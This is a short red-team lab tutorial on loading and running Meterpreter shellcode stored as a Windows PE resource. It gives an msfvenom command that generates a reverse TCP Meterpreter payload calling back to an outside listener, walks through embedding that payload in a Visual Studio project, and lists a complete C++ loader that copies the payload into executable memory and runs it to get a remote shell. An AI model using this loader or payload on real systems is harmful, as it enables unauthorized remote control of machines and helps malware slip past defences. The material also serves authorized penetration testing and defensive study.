# Loading and Executing Shellcode From PE Resources

### Context

This lab shows one of the techniques how one could load and execute a non-staged shellcode from within a C program using PE resources using Visual Studio.

If you've ever tried executing an unstaged shellcode from a C/C++ program, you know that you will be having a hard time doing it if you are defining a huge char array which looks like this (just a snippet):

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LczVIwKttZEVMU9_8lC%2F-LczfJcFJD0TpnAU04hN%2FScreenshot%20from%202019-04-21%2012-33-31.png?alt=media\&token=09c6f6b6-ab5d-4930-aabb-d342b08f08a4)

Below is a quick walkthrough that was inspired by [@\_RastaMouse](https://twitter.com/_RastaMouse) tweet:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LczoBkzLGqzzGPzukuc%2F-LczoFqteVU717Ipt91F%2FScreenshot%20from%202019-04-21%2013-13-14.png?alt=media\&token=c06ed59d-02a1-45ea-a98b-c7be73914e28)

### Embedding The Shellcode as a Resource

Let's generate a non-staged meterpreter payload in binary format first. This will be our resource that we want to embed into our C++ program:

```csharp
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=443 > meterpreter.bin
```

Right click on the `Resource Files` in Solution Explorer and select `Add > Resource`

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LczVIwKttZEVMU9_8lC%2F-Lczg-NC45MAa8Lu8LnR%2FScreenshot%20from%202019-04-21%2012-37-31.png?alt=media\&token=6101dbb2-5022-457e-8915-28f2ce253720)

Click `Import` and select the resource you want to include. In my case - it's the `meterpreter.bin`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LczTw8To3UqxkxWKdwe%2F-LczUQ316ZkEV4levT1d%2FScreenshot%20from%202019-04-21%2011-42-31.png?alt=media\&token=4a009b1c-ccaa-4a1a-8422-a6d7c6b7a75c)

Give resource a resource type name - anything works, but you need to remember it when calling `FindResource` API call (shown later in the code):

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LczTw8To3UqxkxWKdwe%2F-LczUoRNGF7gT-ysXVYe%2FScreenshot%20from%202019-04-21%2011-43-59.png?alt=media\&token=0faf7733-0990-46a7-a2f8-5b16ff07ee90)

At this point, you can see in your resource browser that the `meterpreter.bin` is now included in your program's resources:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LczTw8To3UqxkxWKdwe%2F-LczVB9rZjercKyAxyb1%2FScreenshot%20from%202019-04-21%2011-45-49.png?alt=media\&token=9dadff14-c783-46dd-88e2-b4e3d92c1f5b)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LczVIwKttZEVMU9_8lC%2F-Lcz_5q_rQssqmXsUtU6%2FScreenshot%20from%202019-04-21%2012-07-17.png?alt=media\&token=81368f3f-f534-42f2-80dc-ac35f6a0f978)

If you compile your program now and inspect it with resource hacker, you can now see the shellcode you have just embedded as a PE resource:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Ld4toYVCCRbqcaV0JQl%2F-Ld4u1hNt60p0Ez6Fs0Z%2FScreenshot%20from%202019-04-22%2017-35-35.png?alt=media\&token=a1b99bad-d2cc-4301-bfc3-a3ec21c2da3c)

### Code

We can then leverage a small set of self-explanatory Windows APIs to find the embedded resource, load it into memory and execute it like so:

```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include "resource.h"

int main()
{
	// IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode
	// METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_METERPRETER_BIN1), L"METERPRETER_BIN");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
	
	void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResouceData, shellcodeSize);
	((void(*)())exec)();

	return  0;
}
```

Compile and run the binary and enjoy the shell:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LczVIwKttZEVMU9_8lC%2F-LczeUwKWuJuiJD0HvHt%2FPeek%202019-04-21%2012-30.gif?alt=media\&token=19a500f6-4e0f-40b8-a224-047658b671d0)

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/menurc/finding-and-loading-resources" %}
